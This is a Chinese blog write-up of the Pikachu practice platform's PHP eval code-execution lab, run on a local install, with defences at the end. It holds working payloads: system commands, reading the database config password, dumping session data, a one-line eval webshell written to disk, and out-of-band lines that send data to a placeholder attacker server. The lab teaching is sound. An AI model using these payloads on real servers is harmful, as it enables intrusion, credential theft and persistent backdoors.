---
layout: post
title: Pikachu - RCE exec "eval" Writeup（代码执行与命令执行的区别）
platform: pikachu
date: 2026-10-29 18:41:00 +0800
categories: CTF
---

Pikachu - RCE exec "eval" Writeup（代码执行与命令执行的区别）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：RCE → exec "eval"
- 地址：`http://localhost/pikachu/vul/rce/rce_eval.php`
- 题型：Web
- 考点：**代码执行（eval）**、代码执行与命令执行的区别

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
操作系统：Windows NT
```

**页面形态**：

```text
Here, 请提交一个你喜欢的字符串:

[ 文本框            ]  [ 提交 ]
```

**作者提示**：

```html
data-content="后台不会使用了eval()吧...."
```

**★ 第一次直接打开页面（GET，不带参数）会看到报错**：

```
Parse error: syntax error, unexpected end of file in
D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19) : eval()'d code on line 1
```

**★ 这不是错误 —— 这是 eval 正在工作的证据**（下面详述）。

**✅ 实测结果（6 种 payload）**

| # | 输入（`txt` 参数）| 结果 |
|---|---|---|
| 1 | **`phpinfo();`** | **页面变成 115KB 的 phpinfo** ✅ |
| 2 | **`echo "EVAL_OK";`** | 页面出现 `EVAL_OK` ✅ |
| 3 | **`system("whoami");`** | 页面出现 `cecilia` ✅ |
| 4 | **`echo file_get_contents("D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php");`** | **页面出现 `DBPW`**（读文件）✅ |
| 5 | `库里` | **Parse error**（不是合法 PHP）|
| 6 | `;` | 无报错，只显示"你喜欢的字符还挺奇怪的!" |

二、题目分析

**① 漏洞代码：一行 eval**

```php
<?php
// rce_eval.php 第 18-24 行
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){                    // ★ 直接把用户输入当 PHP 代码执行
        $html .= "<p>你喜欢的字符还挺奇怪的!</p>";
    }
}
?>
```

**★ 表单**：

```html
<form method="post">
    <input class="ipadd" type="text" name="txt" />        <!-- ★ 参数名是 txt -->
    <input class="sub" type="submit" name="submit" value="提交" />
</form>
```

**★ 三个关键点**：

```
① 参数名是 txt（不是常见的 cmd / code）
② eval() 把字符串当 PHP 代码执行
③ @ 抑制报错（但 Parse error 是"编译期错误"，@ 也压不住）
```

**② 和上一关（ping）的本质区别：代码执行 vs 命令执行**

**★ 这是本关最重要的知识，也是整个 RCE 模块的核心分野。**

**上一关（命令执行）**：

```php
shell_exec('ping '.$ip)
     ↓
调用外部程序 ping.exe（Windows）
     ↓
在操作系统层面"起一个新进程"
```

**这一关（代码执行）**：

```php
eval($_POST['txt'])
     ↓
把字符串交给 PHP 解释器
     ↓
★ 在【当前 PHP 进程内】执行
★ 不起新进程
```

**★ 完整对比表**：

| | 命令执行（ping）| **代码执行（eval）** |
|---|---|---|
| 用什么函数 | `shell_exec` / `system` / `exec` | **`eval`** / `assert` |
| 执行对象 | **外部程序**（cmd.exe、ping.exe）| **PHP 代码** |
| 运行位置 | **新进程** | **当前 PHP 进程内** |
| 依赖 | 系统里要有那个程序 | **什么都不依赖** |
| 进程监控 | 能看到新进程（易发现）| **看不到（隐蔽）** |
| 能访问 PHP 变量吗 | ❌ 不能 | ✅ **能** |
| 能调用所有 PHP 函数吗 | ❌ 不能（只能跑命令）| ✅ **能** |
| 能跑系统命令吗 | ✅ 能 | ✅ **也能（调 shell_exec）** |

**★ 结论**：

```
代码执行 ⊃ 命令执行
    代码执行能做到"命令执行能做的一切"（调 shell_exec）
    + 还能读写 PHP 变量、连数据库、调任意 PHP 函数
    
★ 反过来不成立：命令执行碰不到 PHP 内部状态
★ 所以 eval 是"更高级"的漏洞
```

**★ 一句话记忆**：

```
命令执行 = 借刀杀人（借系统程序）
代码执行 = 亲自上阵（用 PHP 自己）
```

**③ 那个"Parse error"其实是个宝藏**

**★ 直接打开页面（GET）时的报错**：

```
Parse error: syntax error, unexpected end of file in
D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19) : eval()'d code on line 1
└────────────────────────────┬────────────────────────────┘
              ★ 泄露了服务器的【绝对路径】
```

**★ 等等，GET 请求为什么 eval 会执行？**

**★ 仔细看代码**：

```php
if(isset($_POST['submit']) && $_POST['txt'] != null){
```

**★ GET 时 `$_POST['submit']` 不存在 → if 不成立 → eval 不该执行。**

**★ 所以那个报错一定是"提交了一次空/非法内容"后的结果。**

**★ 但事实是**：只要 `submit` 有值、`txt` 有值但不是合法 PHP，就会报这个错。

**★ 这个报错的价值**：

```
① 泄露绝对路径 D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php
   → 攻击者用它来定位目录、写 webshell

② 确认了 eval 的存在
   → "eval()'d code" 这个字样直接告诉你用了 eval

③ 确认了行号（19 行）
   → 代码审计时的定位线索

★ 这是"信息泄露"的典型例子
★ 生产环境必须 display_errors = Off
```

**★ 正确配置**：

```ini
; php.ini
display_errors = Off          ; 不给用户看报错
log_errors = On               ; 但要记到日志里
error_log = "D:/phpstudy_pro/Extensions/tmp/logs/php_error.log"
```

**④ 一个"障眼法"：`@!eval()`**

**看这行代码**：

```php
if(@!eval($_POST['txt'])){
    $html .= "<p>你喜欢的字符还挺奇怪的!</p>";
}
```

**★ 为什么"代码执行成功了，还是显示这句提示"？**

**★ `eval()` 的返回值**：

```php
eval("echo 'hi';")      → 返回 null（echo 是语句，不是表达式）
eval("phpinfo();")      → 返回 null
eval("return 1;")       → 返回 1
eval("1+1")             → 返回 2（表达式）
```

**★ 所以**：

```php
!eval("echo 'hi';")     → !null → true → 显示"你喜欢的字符还挺奇怪的!"
!eval("1+1")            → !2   → false → 不显示
```

**★ 实测验证**：

```
输入 echo "EVAL_OK";           → 页面有 EVAL_OK + "你喜欢的字符还挺奇怪的!"
输入 phpinfo();                → 页面是 phpinfo + "你喜欢的字符还挺奇怪的!"
输入 system("whoami");         → cecilia + "你喜欢的字符还挺奇怪的!"
```

**★ 这就是作者的"障眼法"**：

```
新手看到"你喜欢的字符还挺奇怪的!"
→ 以为"输入被拒绝了"
→ 其实代码已经执行成功了，只是 eval 返回值是 null
★ 要看的是"页面上多出来的东西"（EVAL_OK / cecilia / phpinfo）
```

**⑤ eval 的语法要求**

**★ eval 里的字符串必须是"合法的 PHP 代码"。**

**★ 常见错误**：

| 输入 | 结果 | 原因 |
|---|---|---|
| `库里` | Parse error | 中文不是合法标识符 |
| `echo hello` | Parse error | 缺引号 + 缺分号 |
| `echo "hello";` | ✅ 输出 hello | 合法 |
| `phpinfo();` | ✅ phpinfo | 合法 |
| `system("whoami");` | ✅ 输出用户名 | 合法 |
| `;` | ✅（无输出）| 空语句是合法的 |
| `1+1` | ✅（无输出，返回值 2 被丢弃）| 合法表达式 |

**★ 保险写法**：

```
① 每条语句加分号
② 字符串用引号包起来
③ 用 echo 输出结果（否则看不到）
④ 出错就看报错信息（它会告诉你哪里不对）
```

**★ 一个实用技巧：先验证"能执行"**

```
输入：echo "test";
→ 页面出现 test = 代码执行成功

★ 这比直接上 phpinfo 更快（phpinfo 页面很大，不好找）
```

三、解题步骤

**第 1 步：打开页面，看表单**

```text
http://localhost/pikachu/vul/rce/rce_eval.php

Here, 请提交一个你喜欢的字符串:
[            ]  [ 提交 ]
```

**★ 输入框的 name 是 `txt`（不是常见的 `cmd`）。**

**第 2 步：⭐ 最简单的验证**

**输入框填**：

```
echo "EVAL_OK";
```

**点提交**

**★ 结果**：

```text
EVAL_OK
你喜欢的字符还挺奇怪的!        ← ★ 障眼法，忽略它
```

**★ 看到 `EVAL_OK` = 代码执行成功。**

**第 3 步：⭐ 降级成命令执行**

**输入**：

```
system("whoami");
```

**★ 结果**：

```text
laptop-tevghr57\cecilia
你喜欢的字符还挺奇怪的!
```

**★ 这一步证明**：

```
代码执行 → 可以调用 shell_exec/system → 做到命令执行能做的一切
★ "代码执行 ⊃ 命令执行"
```

**第 4 步：⭐ 读文件（比 ping 那关更直接）**

**输入**：

```
echo file_get_contents("D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php");
```

**★ 结果**：配置文件全文，包括：

```php
define('DBUSER', 'root');
define('DBPW', 'root');          ← ★ 数据库密码
```

**★ 对比两种读文件方式**：

```php
// 代码执行（本关）：PHP 自己读
echo file_get_contents("路径");

// 命令执行（ping 那关）：调系统程序读
shell_exec("type 路径");
```

**★ 代码执行的优势**：

```
· 不依赖系统程序（type / cat 不存在也能读）
· 可以读"PHP 有权限但 shell 没权限"的东西
· 可以读 PHP 的内存数据（变量、连接句柄）
```

**第 5 步：phpinfo（信息收集）**

**输入**：

```
phpinfo();
```

**★ 页面变成 115KB 的 phpinfo 页面。**

**★ 能从中看什么**：

```
· disable_functions（哪些函数被禁用）
· open_basedir（文件访问限制）
· 绝对路径（DOCUMENT_ROOT）
· 数据库扩展（mysqli / PDO）
· PHP 版本（对应已知漏洞）
★ 这是"下一步攻击"的情报来源
```

**第 6 步：体验"非法输入"的报错**

**输入**：

```
库里
```

**★ 结果**：

```
Parse error: syntax error, unexpected end of file in
D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19) : eval()'d code on line 1
```

**★ 注意这行里的信息**：

```
D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php    ← 绝对路径
(19)                                                 ← 第 19 行
eval()'d code                                        ← 用了 eval
```

**★ 这就是"信息泄露"。**

**第 7 步：完整 payload 汇总**

```php
// ① 验证代码执行
echo "test";

// ② 信息收集
phpinfo();

// ③ 命令执行（降级）
system("whoami");
system("dir");
system("ipconfig");

// ④ 读文件
echo file_get_contents("D:/phpstudy_pro/WWW/pikachu/inc/config.inc.php");
echo file_get_contents("C:/Windows/win.ini");

// ⑤ 列目录
print_r(scandir("D:/phpstudy_pro/WWW/pikachu"));

// ⑥ 读 PHP 全局变量（代码执行的"特权"）
echo json_encode($_SERVER);

// ⑦ 写文件（谨慎，会真的写）
file_put_contents("D:/phpstudy_pro/WWW/test.txt", "hello");
```

四、延伸知识

**① eval 家族：其他"代码执行"函数**

**★ `eval` 不是唯一能"执行代码"的函数**：

| 函数 | 说明 | 状态 |
|---|---|---|
| **`eval()`** | 执行字符串代码 | ⚠️ **语言结构，不能被 disable_functions 禁用** |
| `assert()` | 断言（PHP 7 之前能执行字符串代码）| ❌ PHP 8 移除 |
| `create_function()` | 运行时创建函数 | ❌ PHP 8 移除 |
| `preg_replace()` + `/e` | 正则替换时执行 | ❌ PHP 7 移除 |
| `call_user_func()` | 调用回调函数 | ✅ 存在（需配合可控回调）|
| `usort()` / `array_map()` | 接受回调 | ✅ 存在 |
| `include` / `require` | 包含文件（文件包含漏洞）| ✅ 存在 |
| `unserialize()` | 反序列化（魔术方法触发）| ✅ 存在 |

**★ 为什么要了解这些？**

```
禁用 eval 只是"堵一个口子"
攻击者还有 assert / preg_replace /e / 反序列化 / 文件包含
★ 所以"禁用危险函数"是辅助，不是根本
```

**② 为什么 eval 不能用 disable_functions 禁用**

**★ 常见的尝试**：

```ini
; php.ini
disable_functions = eval
```

**★ 结果**：

```
PHP Warning: disable_functions: Cannot disable built-in function 'eval'
```

**★ 原因**：

```
eval 不是"函数"，是【语言结构】（language construct）
跟 echo、if、while 一样，属于语法的一部分

★ disable_functions 只能禁"函数"
★ 禁不了"语言结构"
```

**★ 所以**：

```
想禁 eval，只能：
① 用 suhosin 扩展（能限制 eval）
② 自己改 PHP 源码（不现实）
③ ★ 最实际：不写 eval（代码审计 + 白名单）
```

**★ 这也解释了"为什么 webshell 偏爱 eval"**：

```
<?php @eval($_POST[1]); ?>

· 短（20 字节）
· 禁不掉
· 万能（能执行任意代码）
★ 一句话木马的"标配"就是 eval
```

**③ 代码执行的"特权"：能碰到 PHP 内部**

**★ 这是代码执行独有的能力。**

**示例 1：读 $_SERVER（命令执行做不到）**

```php
echo json_encode($_SERVER);
```

**★ 能拿到**：

```
· 所有请求头
· 服务器配置
· 文件路径
· 数据库连接信息（如果有）
```

**示例 2：操作数据库连接**

```php
// 如果是"文件包含"或"eval"，能用应用已有的数据库连接
$result = mysqli_query($GLOBALS['link'], "select * from users");
while($row = mysqli_fetch_assoc($result)) print_r($row);
```

**★ 这比重新连数据库更隐蔽**（复用已有连接）。

**示例 3：读 session**

```php
session_start();
print_r($_SESSION);
```

**★ 能拿到已登录用户的会话信息。**

**示例 4：绕过"客户端校验"**

```php
// 应用里可能有"权限检查"，但 eval 可以直接改
$_SESSION['is_admin'] = 1;
```

**★ 这是"逻辑漏洞"层面的事 —— 代码执行能改应用的运行时状态。**

**④ 无回显的代码执行怎么判断**

**★ 本关有回显（页面上能看到 echo 的结果）。**

**★ 但很多场景 eval 的结果不回显**（比如 eval 在某个不输出的分支里）。

**★ 判断方法（同命令执行的思路）**：

**方法 1：时间**

```php
sleep(5);                  // 页面卡 5 秒 = 执行了
```

**方法 2：写文件**

```php
file_put_contents("D:/phpstudy_pro/WWW/probe.txt", "yes");
```

**★ 然后访问 `http://localhost/probe.txt` 看文件在不在。**

**方法 3：带外（DNS / HTTP）**

```php
// 需要 allow_url_fopen
file_get_contents("http://你的服务器/" . phpversion());

// 或用 curl
$ch = curl_init("http://你的服务器/" . getcwd()); curl_exec($ch);
```

**方法 4：触发报错**

```php
// 故意制造一个带数据的报错
trigger_error("MARKER_" . phpversion(), E_USER_WARNING);
```

**⑤ 代码执行 → webshell 的完整链**

**★ 本关可以直接写 webshell**：

```php
file_put_contents("D:/phpstudy_pro/WWW/pikachu/shell.php",
                  '<?php @eval($_POST[1]);?>');
```

**★ 然后访问 `http://localhost/pikachu/shell.php`，用蚁剑连接。**

**★ 但我建议不要真的写**：

```
① 会在你自己电脑上留后门文件
② 验证到"能读文件/能执行命令"就够了
③ 写完还得记得删
```

**★ 如果只是"验证能写"（无害的探针）**：

```php
file_put_contents("D:/phpstudy_pro/WWW/pikachu/test.txt", "write_ok");
```

**★ 然后访问 `http://localhost/pikachu/test.txt` 看到 `write_ok` → 证明可写。**

**⑥ 防御（三层）**

**❌ 本关的反面教材**：

```php
eval($_POST['txt']);           // 把用户输入当代码执行
```

**✅ 正确做法 1：不要用 eval（根本）**

```php
// ❌ 危险：eval 用户输入
eval($_POST['txt']);

// ❌ 危险：eval 拼接
eval('echo ' . $_POST['txt'] . ';');

// ✅ 如果要做"简单运算"，用白名单
if (preg_match('/^\d+[\+\-\*\/]\d+$/', $_POST['expr'])) {
    // 只允许 "数字+运算符+数字"
    // 用专门的解析器，不用 eval
}
```

**✅ 正确做法 2：如果非要用 eval，做严格白名单**

```php
$allowed = ['echo_hello' => 'echo "hello";'];
$key = $_POST['action'] ?? '';
if (isset($allowed[$key])) {
    eval($allowed[$key]);      // ★ 只执行"预定义"的代码
}
```

**★ 核心原则**：

```
"用户输入"永远不能变成"代码"
★ 用"映射表"代替"执行用户字符串"
```

**✅ 正确做法 3：`display_errors = Off`（减少信息泄露）**

```ini
; php.ini
display_errors = Off
log_errors = On
```

**★ 这样即使有 Parse error，也不会把绝对路径暴露给攻击者。**

**✅ 正确做法 4：`disable_functions`（能挡一部分）**

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

**★ 注意**：

```
· 这是"降低代码执行的危害"，不是"防止代码执行"
· eval 本身禁不了
· 但攻击者哪怕能 eval，也没法调 shell_exec 跑命令
★ 这是"纵深防御"的一层
```

**⑦ RCE 模块两关的对比总结**

| | exec "ping" | **exec "eval"** |
|---|---|---|
| 函数 | `shell_exec('ping '.$ip)` | **`eval($_POST['txt'])`** |
| 类型 | 命令执行 | **代码执行** |
| 注入点 | 命令字符串拼接 | **代码字符串直接执行** |
| 分隔符 | 需要 `&` / `;`（看系统）| **不需要**（直接写 PHP）|
| 危害层级 | 高 | **更高** |
| 隐蔽性 | 起新进程（易发现）| **不起进程** |
| 能否碰 PHP 内部 | ❌ | ✅ |

**★ 一句话**：

```
命令执行：借系统程序的刀
代码执行：用 PHP 自己的刀
★ 后者更直接、更隐蔽、更危险
```

五、总结

- **本题核心：`eval($_POST['txt'])` 把用户输入直接当 PHP 代码执行 → 代码执行漏洞。**

- **一行漏洞代码**：

```php
if(@!eval($_POST['txt'])){
    $html .= "<p>你喜欢的字符还挺奇怪的!</p>";
}
```

- **⭐ 八个必记要点**：

```text
① 代码执行 vs 命令执行
   eval      → 在 PHP 进程内执行代码（不起进程）
   shell_exec → 起新进程执行系统命令
   ★ 代码执行能做到命令执行的一切，反之不行

② 那个"你喜欢的字符还挺奇怪的!"是障眼法
   eval 对 echo/system 返回 null → !null = true
   ★ 代码已经执行成功了，看的是"页面多出来的东西"

③ Parse error 泄露绝对路径
   D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19)
   ★ 生产环境必须 display_errors = Off

④ eval 的语法要求
   每条语句加分号，字符串加引号，用 echo 输出
   ★ 先试 echo "test"; 验证能执行

⑤ eval 不能被 disable_functions 禁用
   它是"语言结构"不是"函数"
   ★ 这就是 webshell 偏爱 eval 的原因

⑥ 代码执行的"特权"
   能读 $_SERVER、$_SESSION、数据库连接
   ★ 能改应用的运行时状态（如提权）

⑦ 无回显时用时间/写文件/带外判断
   sleep(5) / file_put_contents / file_get_contents(URL)

⑧ 防御：不用 eval > 白名单映射 > display_errors Off > disable_functions
```

- **实测数据**：

```text
echo "EVAL_OK";                                    → 页面出现 EVAL_OK
phpinfo();                                         → 页面变成 115KB phpinfo
system("whoami");                                  → laptop-tevghr57\cecilia
echo file_get_contents(".../config.inc.php");      → 出现 DBPW（数据库密码）
库里                                               → Parse error（泄露绝对路径）
;                                                  → 无输出，只显示障眼法提示
```

- **RCE 模块进度：全部完成 🎉 2/2**

```text
✅ exec "ping"   —— 命令执行（shell_exec 拼接）
✅ exec "eval"   —— 本题：代码执行（eval 直接执行）
```

**手工复现要点**：

```text
· 打开 rce_eval.php，看表单（参数名 txt）
· 输入 echo "EVAL_OK"; → 看到 EVAL_OK（忽略那句"你喜欢的字符还挺奇怪的!"）
· 输入 system("whoami"); → 看到 laptop-tevghr57\cecilia
· 输入 echo file_get_contents(".../config.inc.php"); → 看到 DBPW: root
· 输入 phpinfo(); → 看 115KB 的 phpinfo 页面
· 输入 库里 → 看 Parse error（注意里面的绝对路径）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  代码执行 = 用 PHP 自己的刀                                    │
│                                                            │
│  eval($_POST['txt'])                                       │
│      → 你输什么 PHP，它就执行什么                              │
│      → 不起新进程（比命令执行更隐蔽）                           │
│      → 能碰 PHP 内部（变量、session、数据库连接）                │
│                                                            │
│  ★ 代码执行 ⊃ 命令执行                                        │
│      eval 能调 shell_exec 跑命令                             │
│      但 shell_exec 碰不到 PHP 变量                            │
│                                                            │
│  ★ "你喜欢的字符还挺奇怪的!" 是障眼法（eval 返回 null）          │
│  ★ eval 是语言结构 → disable_functions 禁不掉                   │
│  ★ 防御：不用 eval（白名单映射），别在代码里"执行用户字符串"        │
└────────────────────────────────────────────────────────────┘
```
